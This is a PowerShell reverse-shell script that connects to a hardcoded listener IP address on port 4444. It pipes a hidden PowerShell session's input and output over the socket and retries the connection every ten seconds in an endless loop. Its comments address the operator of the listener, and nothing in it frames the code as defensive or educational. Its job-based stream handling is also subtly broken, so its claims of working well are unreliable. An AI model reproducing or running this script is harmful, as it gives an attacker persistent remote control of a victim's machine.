# Use a more robust reverse shell logic for a better interactive experience.
# This script is a common and effective way to get a functional PowerShell session.

# The IP address of your listener (VPS)
$ip = "31.57.46.127"
# The port your listener is running on
$port = 4444

# Keep trying to connect in a loop
while ($true) {
    try {
        # Create a TCP client object
        $client = New-Object System.Net.Sockets.TCPClient
        # Connect to your listener
        $client.Connect($ip, $port)

        if ($client.Connected) {
            # Get the network stream
            $stream = $client.GetStream()
            
            # Create objects to read from and write to the stream
            $reader = New-Object System.IO.StreamReader($stream)
            $writer = New-Object System.IO.StreamWriter($stream)
            
            # Start a PowerShell process that will execute commands
            $process = New-Object System.Diagnostics.Process
            $process.StartInfo.FileName = "powershell.exe"
            # Use arguments to prevent the process from creating a new window
            $process.StartInfo.Arguments = "-NoExit -Command -"
            # Redirect the input, output, and error streams
            $process.StartInfo.UseShellExecute = $false
            $process.StartInfo.RedirectStandardOutput = $true
            $process.StartInfo.RedirectStandardError = $true
            $process.StartInfo.RedirectStandardInput = $true
            $process.Start()

            # Create a script block to read from the remote stream and write to the PowerShell process's input
            $in_stream = {
                while ($true) {
                    $cmd = $reader.ReadLine()
                    $process.StandardInput.WriteLine($cmd)
                }
            }

            # Create a script block to read from the PowerShell process's output/error and write to the remote stream
            $out_stream = {
                while ($true) {
                    # Read from both the output and error streams
                    $output = $process.StandardOutput.ReadToEnd() + $process.StandardError.ReadToEnd()
                    if ($output) {
                        $writer.WriteLine($output)
                        $writer.Flush()
                    }
                }
            }
            
            # Start the input and output streams as jobs
            $input_job = Start-Job -ScriptBlock $in_stream
            $output_job = Start-Job -ScriptBlock $out_stream
            
            # Wait for the jobs to complete (this will effectively run forever)
            Wait-Job -Job $input_job, $output_job
            
            # Clean up when the connection closes
            $client.Close()
            $process.Kill()
        }
    } catch {
        # Log the error or silently ignore it
        Write-Host "Error: $($_.Exception.Message)"
    }
    
    # Wait 10 seconds before retrying the connection
    Start-Sleep -Seconds 10
}
